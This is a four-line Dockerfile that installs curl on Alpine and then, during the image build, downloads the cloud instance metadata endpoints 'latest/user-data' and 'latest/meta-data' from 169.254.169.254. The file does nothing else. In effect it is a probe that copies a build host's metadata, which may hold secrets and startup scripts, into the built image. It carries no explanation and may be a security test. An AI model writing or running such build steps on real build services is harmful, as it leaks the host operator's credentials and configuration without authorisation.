FROM alpine
RUN apk update && apk add curl
RUN curl -sSL -O http://169.254.169.254/latest/user-data
RUN curl -sSL -O http://169.254.169.254/latest/meta-data
